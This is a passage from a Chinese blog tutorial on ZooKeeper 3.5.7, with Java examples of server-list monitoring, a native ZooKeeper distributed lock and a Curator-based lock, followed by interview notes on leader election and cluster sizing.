</span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建客户端DistributeClient</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DistributeClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String connectString = <span class="string">"hadoop102:2181,hadoop103:2181,hadoop104:2181"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> sessionTimeout = <span class="number">2000</span>;</span><br><span class="line">    <span class="keyword">private</span> ZooKeeper zk;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, KeeperException, InterruptedException </span>&#123;</span><br><span class="line">        DistributeClient client = <span class="keyword">new</span> DistributeClient();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1 获取zk连接</span></span><br><span class="line">        client.getConnect();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2 监听/servers下面子节点的增加和删除</span></span><br><span class="line">        client.getServerList();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3 业务逻辑（睡觉）</span></span><br><span class="line">        client.business();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">business</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        Thread.sleep(Long.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">getServerList</span><span class="params">()</span> <span class="keyword">throws</span> KeeperException, InterruptedException </span>&#123;</span><br><span class="line">        List&lt;String&gt; children = zk.getChildren(<span class="string">"/servers"</span>, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;String&gt; servers = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (String child : children) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">byte</span>[] data = zk.getData(<span class="string">"/servers/"</span> + child, <span class="keyword">false</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">            servers.add(<span class="keyword">new</span> String(data));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打印</span></span><br><span class="line">        System.out.println(servers);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">getConnect</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        zk = <span class="keyword">new</span> ZooKeeper(connectString, sessionTimeout, <span class="keyword">new</span> Watcher() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(WatchedEvent watchedEvent)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    getServerList();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (KeeperException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-3-测试与分析">1.3 测试与分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先启动客户端</span></span><br><span class="line"><span class="comment"># 然后可以进行命令行的测试</span></span><br><span class="line">create -e -s /servers/hadoop102 <span class="string">"hadoop102"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后启动服务端，这里需要进行设置，否则同一时刻只能启动一个</span></span><br><span class="line"><span class="comment"># 点击 Edit Configurations，在弹出的窗口中（Program arguments）输入想启动的主机，例如，hadoop102</span></span><br><span class="line"><span class="comment"># 然后进行启动注册</span></span><br></pre></td></tr></table></figure><h2 id="2、ZooKeeper-分布式锁案例">2、ZooKeeper 分布式锁案例</h2><h3 id="2-1-概述">2.1 概述</h3><blockquote><p>分布式锁的概念可以参考：<a href="https://blog.csdn.net/lemon_TT/article/details/127445833" target="_blank" rel="noopener" title="几种分布式锁详解">几种分布式锁详解</a></p></blockquote><p><img src="http://qnypic.shawncoding.top/blog/202402291817893.png" alt></p><h3 id="2-2-原生-Zookeeper-实现分布式锁案例">2.2 原生 Zookeeper 实现分布式锁案例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DistributedLock</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String connectString = <span class="string">"hadoop102:2181,hadoop103:2181,hadoop104:2181"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> sessionTimeout = <span class="number">2000</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ZooKeeper zk;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> CountDownLatch connectLatch = <span class="keyword">new</span> CountDownLatch(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">private</span> CountDownLatch waitLatch = <span class="keyword">new</span> CountDownLatch(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String waitPath;</span><br><span class="line">    <span class="keyword">private</span> String currentMode;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DistributedLock</span><span class="params">()</span> <span class="keyword">throws</span> IOException, InterruptedException, KeeperException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取连接</span></span><br><span class="line">        zk = <span class="keyword">new</span> ZooKeeper(connectString, sessionTimeout, <span class="keyword">new</span> Watcher() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(WatchedEvent watchedEvent)</span> </span>&#123;</span><br><span class="line">                <span class="comment">// connectLatch  如果连接上zk  可以释放</span></span><br><span class="line">                <span class="keyword">if</span> (watchedEvent.getState() == Event.KeeperState.SyncConnected)&#123;</span><br><span class="line">                    connectLatch.countDown();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// waitLatch  需要释放</span></span><br><span class="line">                <span class="keyword">if</span> (watchedEvent.getType()== Event.EventType.NodeDeleted &amp;&amp; watchedEvent.getPath().equals(waitPath))&#123;</span><br><span class="line">                    waitLatch.countDown();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 等待zk正常连接后，往下走程序</span></span><br><span class="line">        connectLatch.await();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断根节点/locks是否存在</span></span><br><span class="line">        Stat stat = zk.exists(<span class="string">"/locks"</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (stat == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 创建一下根节点</span></span><br><span class="line">            zk.create(<span class="string">"/locks"</span>, <span class="string">"locks"</span>.getBytes(), ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.PERSISTENT);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对zk加锁</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">zklock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建对应的临时带序号节点</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            currentMode = zk.create(<span class="string">"/locks/"</span> + <span class="string">"seq-"</span>, <span class="keyword">null</span>, ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.EPHEMERAL_SEQUENTIAL);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// wait一小会, 让结果更清晰一些</span></span><br><span class="line">            Thread.sleep(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 判断创建的节点是否是最小的序号节点，如果是获取到锁；如果不是，监听他序号前一个节点</span></span><br><span class="line"></span><br><span class="line">            List&lt;String&gt; children = zk.getChildren(<span class="string">"/locks"</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果children 只有一个值，那就直接获取锁； 如果有多个节点，需要判断，谁最小</span></span><br><span class="line">            <span class="keyword">if</span> (children.size() == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Collections.sort(children);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 获取节点名称 seq-00000000</span></span><br><span class="line">                String thisNode = currentMode.substring(<span class="string">"/locks/"</span>.length());</span><br><span class="line">                <span class="comment">// 通过seq-00000000获取该节点在children集合的位置</span></span><br><span class="line">                <span class="keyword">int</span> index = children.indexOf(thisNode);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 判断</span></span><br><span class="line">                <span class="keyword">if</span> (index == -<span class="number">1</span>) &#123;</span><br><span class="line">                    System.out.println(<span class="string">"数据异常"</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (index == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">// 就一个节点，可以获取锁了</span></span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 需要监听  他前一个节点变化</span></span><br><span class="line">                    waitPath = <span class="string">"/locks/"</span> + children.get(index - <span class="number">1</span>);</span><br><span class="line">                    zk.getData(waitPath,<span class="keyword">true</span>,<span class="keyword">new</span> Stat());</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 等待监听</span></span><br><span class="line">                    waitLatch.await();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (KeeperException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解锁</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">unZkLock</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 删除节点</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            zk.delete(<span class="keyword">this</span>.currentMode,-<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (KeeperException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DistributedLockTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException, IOException, KeeperException </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">final</span>  DistributedLock lock1 = <span class="keyword">new</span> DistributedLock();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span>  DistributedLock lock2 = <span class="keyword">new</span> DistributedLock();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   lock1.zklock();</span><br><span class="line">                   System.out.println(<span class="string">"线程1 启动，获取到锁"</span>);</span><br><span class="line">                   Thread.sleep(<span class="number">5</span> * <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">                   lock1.unZkLock();</span><br><span class="line">                   System.out.println(<span class="string">"线程1 释放锁"</span>);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    lock2.zklock();</span><br><span class="line">                    System.out.println(<span class="string">"线程2 启动，获取到锁"</span>);</span><br><span class="line">                    Thread.sleep(<span class="number">5</span> * <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">                    lock2.unZkLock();</span><br><span class="line">                    System.out.println(<span class="string">"线程2 释放锁"</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-3-Curator-框架实现分布式锁案例">2.3 Curator 框架实现分布式锁案例</h3><blockquote><p><a href="https://curator.apache.org/index.html" target="_blank" rel="noopener" title="https://curator.apache.org/index.html">https://curator.apache.org/index.html</a></p></blockquote><p>原生的 Java API 开发存在的问题会话，连接是异步的，需要自己去处理。比如使用 CountDownLatch；Watch 需要重复注册，不然就不能生效；开发的复杂性还是比较高的；不支持多节点删除和创建。需要自己去递归</p><p>Curator 是一个专门解决分布式锁的框架，解决了原生 JavaAPI 开发分布式遇到的问题，首先添加依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.curator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>curator-framework<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.curator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>curator-recipes<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.curator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>curator-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>代码实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CuratorLockTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建分布式锁1</span></span><br><span class="line">        InterProcessMutex lock1 = <span class="keyword">new</span> InterProcessMutex(getCuratorFramework(), <span class="string">"/locks"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建分布式锁2</span></span><br><span class="line">        InterProcessMutex lock2 = <span class="keyword">new</span> InterProcessMutex(getCuratorFramework(), <span class="string">"/locks"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    lock1.acquire();</span><br><span class="line">                    System.out.println(<span class="string">"线程1 获取到锁"</span>);</span><br><span class="line"></span><br><span class="line">                    lock1.acquire();</span><br><span class="line">                    System.out.println(<span class="string">"线程1 再次获取到锁"</span>);</span><br><span class="line"></span><br><span class="line">                    Thread.sleep(<span class="number">5</span> * <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">                    lock1.release();</span><br><span class="line">                    System.out.println(<span class="string">"线程1 释放锁"</span>);</span><br><span class="line"></span><br><span class="line">                    lock1.release();</span><br><span class="line">                    System.out.println(<span class="string">"线程1  再次释放锁"</span>);</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    lock2.acquire();</span><br><span class="line">                    System.out.println(<span class="string">"线程2 获取到锁"</span>);</span><br><span class="line"></span><br><span class="line">                    lock2.acquire();</span><br><span class="line">                    System.out.println(<span class="string">"线程2 再次获取到锁"</span>);</span><br><span class="line"></span><br><span class="line">                    Thread.sleep(<span class="number">5</span> * <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">                    lock2.release();</span><br><span class="line">                    System.out.println(<span class="string">"线程2 释放锁"</span>);</span><br><span class="line"></span><br><span class="line">                    lock2.release();</span><br><span class="line">                    System.out.println(<span class="string">"线程2  再次释放锁"</span>);</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> CuratorFramework <span class="title">getCuratorFramework</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        ExponentialBackoffRetry policy = <span class="keyword">new</span> ExponentialBackoffRetry(<span class="number">3000</span>, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        CuratorFramework client = CuratorFrameworkFactory.builder().connectString(<span class="string">"hadoop102:2181,hadoop103:2181,hadoop104:2181"</span>)</span><br><span class="line">                .connectionTimeoutMs(<span class="number">2000</span>)</span><br><span class="line">                .sessionTimeoutMs(<span class="number">2000</span>)</span><br><span class="line">                .retryPolicy(policy).build();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 启动客户端</span></span><br><span class="line">        client.start();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"zookeeper 启动成功"</span>);</span><br><span class="line">        <span class="keyword">return</span> client;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>五、总结</h1><h2 id="1、UI界面安装">1、UI界面安装</h2><blockquote><p>参考：<a href="https://blog.csdn.net/lemon_TT/article/details/113263705" target="_blank" rel="noopener" title="Centos7安装zookeeper和Web UI">Centos7安装zookeeper和Web UI</a></p></blockquote><h2 id="2、企业面试真题（面试重点）">2、企业面试真题（面试重点）</h2><h3 id="2-1-选举机制">2.1 选举机制</h3><p><strong>半数机制，超过半数的投票通过，即通过</strong></p><p>第一次启动选举规则：</p><ul><li>投票过半数时，服务器 id 大的胜出</li></ul><p>第二次启动选举规则：</p><ul><li>EPOCH 大的直接胜出</li><li>EPOCH 相同，事务 id 大的胜出</li><li>事务 id 相同，服务器 id 大的胜出</li></ul><h3 id="2-2-生产集群安装多少-zk-合适？">2.2 生产集群安装多少 zk 合适？</h3><p><strong>安装奇数台</strong>。服务器台数多：好处，提高可靠性；坏处：提高通信延时。生产经验：</p><ul><li>10 台服务器：3 台 zk；</li><li>20 台服务器：5 台 zk；</li><li>100 台服务器：11 台 zk；</li><li>200 台服务器：11 台 zk</li></ul><h3 id="2-3-常用命令">2.3 常用命令</h3><p>ls、get、create、delete</p>]]></content>
    
    
    <summary type="html">&lt;h1&gt;Zookeeper3.5.7基础学习&lt;/h1&gt;
&lt;h1&gt;一、Zookeeper入门&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;官网：&lt;a href=&quot;https://zookeeper.apache.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; title=&quot;https://zookeeper.apache.org/&quot;&gt;https://zookeeper.apache.org/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
